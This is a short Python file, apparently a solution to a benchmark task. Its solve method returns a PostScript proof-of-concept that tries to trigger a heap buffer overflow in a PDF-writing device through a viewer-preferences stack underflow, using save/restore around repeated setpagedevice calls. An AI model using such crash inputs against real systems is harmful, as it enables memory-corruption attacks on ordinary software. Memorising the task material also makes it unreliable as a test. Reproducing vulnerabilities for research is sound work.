import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in pdfwrite.
        The vulnerability is caused by an underflow in the viewer preference stack
        (restoring viewer state when depth is 0).
        """
        # The PoC uses PostScript to manipulate the pdfwrite device parameters.
        # We use save/restore blocks combined with setpagedevice to try and trigger
        # a 'restore' operation on the internal stack without a corresponding 'push'.
        # Specifically, setting the same ViewerPreferences inside a save block might
        # bypass the push logic (optimization) but the restore block will still trigger a pop.
        
        return b"""%!PS
% Define a viewer preferences dictionary
/vp << /HideToolbar true /HideMenubar true >> def

% Initialize ViewerPreferences on the device
<< /ViewerPreferences vp >> setpagedevice

% Loop to repeatedly attempt to trigger the underflow
10 {
  save
    % Setting the preferences to the same value again.
    % If the device logic checks for changes before pushing, it might not push.
    << /ViewerPreferences vp >> setpagedevice
  restore
  % Upon restore, the device attempts to revert state.
  % If it assumes a push happened, it will pop.
  % If no push happened, stack underflows -> Crash.
} repeat

% Attempt a variation with null (clearing preferences)
save
  << /ViewerPreferences null >> setpagedevice
restore

quit
"""